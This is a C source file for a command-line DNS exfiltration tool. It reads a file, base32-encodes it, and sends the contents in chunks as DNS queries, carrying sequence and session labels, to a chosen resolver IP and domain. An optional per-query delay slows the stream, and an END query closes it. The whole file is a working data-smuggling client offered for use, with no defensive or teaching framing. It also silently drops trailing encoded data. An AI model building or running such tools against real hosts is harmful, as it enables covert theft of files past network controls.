#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

#define DEFAULT_PORT 5353
#define DEFAULT_CHUNK 56
#define MAX_PACKET 512

/* BASE32 */
static const char b32[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

void base32_encode(const unsigned char *data, int len, char *out) {
    int buffer = 0, bitsLeft = 0, out_i = 0;

    for (int i = 0; i < len; i++) {
        buffer = (buffer << 8) | data[i];
        bitsLeft += 8;

        while (bitsLeft >= 5) {
            out[out_i++] = b32[(buffer >> (bitsLeft - 5)) & 0x1F];
            bitsLeft -= 5;
        }
    }

    if (bitsLeft > 0)
        out[out_i++] = b32[(buffer << (5 - bitsLeft)) & 0x1F];

    out[out_i] = '\0';
}

#pragma pack(push, 1)
struct dns_header {
    uint16_t id, flags, qdcount, ancount, nscount, arcount;
};
#pragma pack(pop)

int build_qname(unsigned char *buf, const char *domain) {
    int len = 0;
    char tmp[512];
    strcpy(tmp, domain);

    char *token = strtok(tmp, ".");
    while (token) {
        int l = strlen(token);
        buf[len++] = l;
        memcpy(buf + len, token, l);
        len += l;
        token = strtok(NULL, ".");
    }

    buf[len++] = 0;
    return len;
}

void send_dns(const char *domain, const char *dns, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, dns, &server.sin_addr);

    unsigned char packet[MAX_PACKET] = {0};

    struct dns_header *hdr = (struct dns_header*)packet;
    hdr->id = htons(rand());
    hdr->flags = htons(0x0100);
    hdr->qdcount = htons(1);

    unsigned char *qname = packet + sizeof(struct dns_header);
    int qlen = build_qname(qname, domain);

    unsigned char *q = qname + qlen;
    *(uint16_t*)q = htons(1);
    *(uint16_t*)(q+2) = htons(1);

    sendto(sock, packet, sizeof(struct dns_header)+qlen+4, 0,
           (struct sockaddr*)&server, sizeof(server));

    printf("[SENT] %s\n", domain);
    close(sock);
}

void help(char *prog) {
    printf("\nUsage:\n  %s <file> <domain> <dns_ip> [-p port] [-d delay] [-c chunk]\n\n", prog);
    printf("Options:\n");
    printf("  -p <port>    DNS port (default: 5353)\n");
    printf("  -d <delay>   Delay in seconds (default: 0)\n");
    printf("  -c <chunk>   Chunk size (default: 56, must be multiple of 8 <= 56)\n\n");
}

int main(int argc, char *argv[]) {

    if (argc < 4) {
        help(argv[0]);
        return 0;
    }

    int port = DEFAULT_PORT;
    int delay = 0;
    int chunk_size = DEFAULT_CHUNK;

    for (int i = 4; i < argc; i++) {
        if (!strcmp(argv[i], "-p")) port = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-d")) delay = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-c")) chunk_size = atoi(argv[++i]);
    }

    if (chunk_size > 56 || chunk_size % 8 != 0) {
        printf("[ERR] Chunk must be multiple of 8 and <= 56\n");
        return 1;
    }

    srand(time(NULL));

    FILE *f = fopen(argv[1], "rb");
    if (!f) return 1;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    unsigned char *data = malloc(size);
    fread(data, 1, size, f);
    fclose(f);

    char *encoded = malloc(size * 2);
    base32_encode(data, size, encoded);

    int session = rand() % 10000;
    int seq = 0;
    int len = strlen(encoded);
    int safe_len = len - (len % 8);

    for (int offset = 0; offset < safe_len; offset += chunk_size) {

        char chunk[64];
        int l = (safe_len - offset > chunk_size) ? chunk_size : safe_len - offset;

        strncpy(chunk, encoded + offset, l);
        chunk[l] = 0;

        char domain[512];
        snprintf(domain, sizeof(domain),
                 "%d.%d.%s.%s", seq++, session, chunk, argv[2]);

        send_dns(domain, argv[3], port);

        if (delay > 0) sleep(delay);
    }

    char end[256];
    snprintf(end, sizeof(end), "999.%d.END.%s", session, argv[2]);
    send_dns(end, argv[3], port);

    free(data);
    free(encoded);
}
